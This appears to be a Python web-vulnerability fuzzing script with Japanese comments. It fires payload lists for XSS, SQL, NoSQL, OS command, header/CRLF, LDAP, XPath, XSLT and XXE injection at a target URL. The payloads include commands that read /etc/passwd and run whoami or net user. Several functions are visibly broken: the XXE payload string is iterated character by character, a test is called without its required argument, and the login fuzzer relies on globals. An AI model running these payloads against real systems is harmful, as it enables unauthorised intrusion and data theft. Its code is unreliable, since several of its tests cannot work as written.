import requests
import json
import sys
from ldap3 import Server, Connection, ALL
from lxml import etree

# テスト用ペイロードの定義
XSS_PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\")'>"
    ]
SQL_PAYLOADS = [ 
    "'",
    "' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1'--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username, password FROM users--"
    ]
OS_COMMAND_PAYLOADS = [
    "; ls",
    "&& ls",
    "| ls",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "& whoami",
    "| whoami",
    "& net user"
    ]
NO_SQL_PAYLOADS = [
    '{ "username": { "$ne": "" } }',
    '{ "username": "admin", "password": { "$ne": "" } }',
    '{ "$where": "this.username == \\"admin\\" && this.password != \\"password\\""}',
    '{ "username": { "$gt": "" } }',
    '{ "username": null, "password": { "$ne": null } }'
]
HEADER_PAYLOADS = [
    "test\r\nInjected-Header: injected_value",
    "test\nX-Injected: injected_value",
    "\r\nSet-Cookie: test=1",
    "%0d%0aContent-Length:0%0d%0aInjected-Header: injected_value"
]
JSON_PAYLOADS = [
    '"; "role":"admin',
    '"}, "role":"admin',
    '", "role": "admin}',
    '"<script>alert(1)</script>',
    '"username": "admin", "password": {"$ne": null}',
    '{"username": "admin", "role": {"$gt": "user"}}'
]
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie: admin=true",
    "%0d%0aContent-Length: 0%0d%0aInjected-Header: test",
    "\r\nLocation: https://malicious.com",
    "\nX-Test: injected_value"
]
LDAP_PAYLOADS = [
    "*)(&(objectClass=*))",
    "*)|(&(objectCategory=person)(objectClass=user))",
    "*)(&(objectCategory=person)(cn=*))",
    "*))(|(objectClass=*))",
    "*)(uid=*))(|(uid=*))"
]
UNICODE_PAYLOADS = [
    "%u0027",
    "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
    "%u003Cimg src=x onerror=alert(1)%u003E",
    "%u003Cbody onload=alert(1)%u003E"
]
XPATH_PAYLOADS = [
    "admin' or '1'='1",
    "' or 1=1 or ''='",
    "' and count(/*)=1 and ''='",
    "' union /user[name/text()='admin']/password/text() and ''='"
]
XSLT_PAYLOADS = [
    '''
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="system-property('os.name')"/>
      </xsl:template>
    </xsl:stylesheet>
    ''',
    '''
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="document('file:///etc/passwd')"/>
      </xsl:template>
    </xsl:stylesheet>
    '''
]
XXE_PAYLOADS = """
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
"""

# ファジング関数 
def fuzz(url, base_params, target_param, payloads=None):
    if payloads is None:
        payloads = XSS_PAYLOADS + OS_COMMAND_PAYLOADS

    #比較用のレスポンステキスト
    response = requests.get(url, params=base_params)
    result = response.text

    for payload in payloads:
        test_params = base_params.copy()
        test_params[target_param] = payload
        try:
            response_parttern = requests.get(url, params=test_params)
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found Injection')
                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 

def fuzz_login(url, username_input_field="username", password_input_field="password", payload=None):
    
    for payload in SQL_PAYLOADS:
        data = {
            username_field: username_input_field + "=" + payload,
            password_field: password_input_field + "=" + "dummy"
        }
        try:
            res = requests.post(url, data=data)
            if "invalid" not in res.text.lower() and res.status_code == 200:
                print(f"Possible | username: {payload}")
            else:
                print(f"No Possible | username : {payload}")
        except Exception as e:
            print(f"Error username form: {payload}）: {e}")

    for payload in SQL_PAYLOADS:
        data = {
            username_field: username_input_field + "=" + "dummy",
            password_field: password_input_field + "=" + payload
        }
        try:
            res = requests.post(url, data=data)
            if "invalid" not in res.text.lower() and res.status_code == 200:
                print(f"Possible | password: {payload}")
            else:
                print(f"No Possible | password: {payload}")
        except Exception as e:
            print(f"Error password form: {payload}）: {e}")

# NoSQLインジェクション
def test_nosql_injection(url):
    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text

    headers = {'Content-Type': 'application/json'}
    for payload in NO_SQL_PAYLOADS:
        try:
            response_parttern = requests.post(url, json=payload, headers=headers)
            
            if response_parttern.text != result:
                print(f'Found NoSQL Injection')
                print(f"Payload: {payload} | Status: {response_parttern.status_code}")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error: {e}")


# CSTIテスト関数
def test_csti(url):
    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text
    
    CSTI_PAYLOADS = ["${7*7}"]
    for payload in CSTI_PAYLOADS:
        try:
            response_parttern = requests.get(url, params={"name": payload})
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found CSTI Injection')
                print(f"Payload: {payload} | Response: {response_parttern.text[:100]}")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error: {e}")


# HTTP Header Injecion 
def test_header_injection(url, headers):
    """
    HTTPヘッダーインジェクションのテスト
    """
    #比較用のレスポンステキスト
    response = requests.get(url)
    result = response.text

    for payload in HEADER_PAYLOADS:
        test_headers = {key: payload for key in headers}
        try:
            response_parttern = requests.get(url, headers=test_headers)
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found HTTP Header Injection')
                print(f"Tested with payload: {payload}")
                print(f"Status Code: {response_parttern.status_code}")
                print(f"Response Headers: {response_parttern.headers}")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}")


# LDAPインジェクション 最初のレスポンス内容の（いろんなインジェクションを比較するため）
def test_ldap_injection(server_url: str, base_dn: str):
    server = Server(server_url, get_info=ALL)
    conn = Connection(server)
    if not conn.bind():
        print("Bind failed.")
        return

    for payload in LDAP_PAYLOADS:
        try:
            search_filter = f"(uid={payload})"
            conn.search(search_base=base_dn, search_filter=search_filter, attributes=["cn", "mail", "uid", "telephoneNumber"])
            if conn.entries:
                print(f"[+] Injection possible with payload: {payload}")
                for entry in conn.entries:
                    print(f" - {entry}")
            else:
                print(f"[-] No result for: {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")
    conn.unbind()



def split_domain(target_url):
    # ドットを基準に分割
    parts = target_url.rsplit('.', 1)  # 右から1回だけ分割

    if len(parts) == 2:
        domain, extension = parts
        return domain, extension
    else:
        return target_url, ""  # 拡張子がない場合

# JSONインジェクション
def test_json_injection(url, base_data):
    """
    JSONインジェクションのテスト
    """
    headers = {
        "Content-Type": "application/json"
    }
    for payload in JSON_PAYLOADS:
        data = base_data.copy()
        data["username"] = payload

        try:
            response = requests.post(url, data=json.dumps(data), headers=headers)
            
            if "admin" in response.text or "alert" in response.text:
                print(f"Potential vulnerability found with payload: {payload}\n")
                print(f"Tested with payload: {payload}")
                print(f"Status Code: {response.status_code}")
                print(f"Response Text: {response.text[:100]}")

            else:
                print(f"Not found | {payload}")
        except Exception as e:
            print(f"Error with payload {payload}: {e}")


#CRLFインジェクション
def test_crlf_injection(url):
    """
    CRLFインジェクションのテスト関数
    """
    for payload in CRLF_PAYLOADS:
        response = requests.get(url, params=payload)

        # レスポンスヘッダーにペイロードが含まれていれば脆弱性が存在する可能性
        if "X-Custom-Header" in response.headers or "Set-Cookie" in response.headers:
            print(f"Potential CRLF Injection with payload: {payload}")
            print(f"Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response Headers:\n{response.headers}\n")
        else:
            print(f"Not found {payload}")


#unicodeインジェクション
def test_unicode_injection(url, param):
    for payload in UNICODE_PAYLOADS:
        params = {param: "admin" + payload}
        response = requests.get(url, params=params)
        

        if "root:" in response.text:
            print(f"Potential Path Traversal with payload: {payload}")
            print(f"Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response:\n{response.text[:100]}\n")
        elif "<script>alert(1)</script>" in response.text:
            print(f"Potential XSS with payload: {payload}")
            print(f"Tested payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response:\n{response.text[:100]}\n")
        else:
            print(f"Not Found {payload}")


#XPathインジェクション検証　　
def test_xpath_injection(url):
    for payload in XPATH_PAYLOADS:
        # 脆弱なXPathクエリ
        query = f"//user[username='{payload}']/password"

        #比較用のレスポンステキスト
        response = requests.get(url,  headers={'Content-Type': 'application/xml'})
        result = response.text

        try:
            response_parttern = requests.get(url, query,  headers={'Content-Type': 'application/xml'})
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found XPath Injection')
                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 

        
    
#リクエストされていない　インジェクションの仕方が謎
#XSLTインジェクション検証
def test_xslt_injection(url):
   for payload in XSLT_PAYLOADS:
        # XSLTのパース
        xslt_root = etree.XML(payload)
        xslt_doc = etree.XSLT(xslt_root)
            
        #比較用のレスポンステキスト
        response = requests.get(url,  headers={'Content-Type': 'application/xml'})
        result = response.text

        try:
            response_parttern = requests.get(url, xslt_doc, headers={'Content-Type': 'application/xml'})
            
            if response_parttern.status_code != response.status_code or response_parttern.text != result:
                print(f'Found XSLT Injection')
                print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
            else:
                print(f'Not Found | {payload}')
        except Exception as e:
            print(f"Error with payload {payload}: {e}") 


#XXE 検証　
def test_xxe(url):
    print("=== Testing XXE Payload ===")
    for payload in XXE_PAYLOADS:
        #外部エンティティを含む特別に細工されたXMLに変換
        try:
            # XXE脆弱性があるパーサー
            parser = etree.XMLParser(resolve_entities=True)  # 外部エンティティを解決する設定　取り扱い注意！
            doc = etree.fromstring(payload, parser)
            
            #比較用のレスポンステキスト
            response = requests.get(url,  headers={'Content-Type': 'application/xml'})
            result = response.text

            try:
                response_parttern = requests.get(url, doc,  headers={'Content-Type': 'application/xml'})
            
                if response_parttern.status_code != response.status_code or response_parttern.text != result:
                    print(f'Found XXE Injection')
                    print(f"Tested payload: {payload} | Status: {response_parttern.status_code} ")
                else:
                    print(f'Not Found | {payload}')
            except Exception as e:
                print(f"Error with payload {payload}: {e}") 
        except Exception as e:
            print(f"[-] Failed to parse: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python fuzzing.py <URL> or python fuzzing.py <URL> <username_field>  <password_field>  username_field and password_field are parameters!")
        sys.exit(1)

    target_url = sys.argv[1]
    username_field = sys.argv[2]
    password_field = sys.argv[3]
    print(f"Target URL: {target_url}")
    
    print("=== XSS SQL OS Injection Test === ")

    print("=== Fuzzing ===")
    fuzz(target_url, base_params={"q": "test"}, target_param="q" )
    fuzz_login(target_url, username_field,  password_field)

    print('=== NoSQL Injection Test ===') 
    test_nosql_injection(target_url)

    print("=== CSTI Test ===")
    test_csti(target_url)

    print("=== HTTP Header Injection Test ===")
    headers = {"User-Agent": "test"}  
    test_header_injection(target_url, headers)
    
    print("=== LDAP Injection ===") 
    if "ldap://" in target_url:
        print("contain 'ldap://' ")  
        domain, extension = split_domain(target_url.replace("ldap://", ""))
        base_dn = f"dc={domain},dc={extension}"
        test_ldap_injection(target_url, base_dn)
    else:
        print("This url do not contain ldap")
    
    print("=== JSON Injecion Test ===")
    base_data = {
        "username": "test",
        "role": "user"
    }
    test_json_injection(target_url, base_data)

    print("=== CSLF Injection Test ===")
    test_crlf_injection(target_url)

    print("=== Unicode Injection Test ===")
    test_unicode_injection(target_url) 
    
    print("=== XPath Injection Test ===") 
    test_xpath_injection(target_url)

    print("===XSLT Injection Test ===") 
    test_xslt_injection(target_url)

    print("===XXE Test ===") 
    test_xxe(target_url)
    

    print("Finish check!")